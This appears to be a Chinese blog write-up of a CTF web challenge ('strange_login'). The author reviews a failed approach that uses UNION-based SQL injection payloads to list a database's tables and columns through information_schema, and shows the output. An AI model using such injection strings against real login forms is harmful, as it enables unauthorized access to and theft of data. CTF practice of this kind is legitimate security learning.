---
title: 'NewStar CTF 2025 Week1 - Web strange_login'
categories:
  - 
tags: []
abbrlink: a382fab
date: 2026-02-03 20:28:31
---
# NewStar CTF 2025 Week1 - Web strange_login

其实这道题目你静下心来想：如果真的sql注入的话为什么还要提示你万能密码

不就是故意想要让你误解吗？

所以一定是万能密码



![image-20260203202547236](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260203202547236.png)

那么来回看我的错误吧

![image-20260203201248056](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260203201248056.png)





```
1'union select 1,group_concat(table_name),3,4  from information_schema.tables where table_schema = 'ctf_db'#
或者
1'union select 1,group_concat(table_name),3,4  from information_schema.tables where table_schema=database()#
```



![image-20260203201820966](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260203201820966.png)





```
1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'users'#
->
id,username,password,role,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY！
```



![image-20260203202130843](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260203202130843.png)

发现并没有找到flag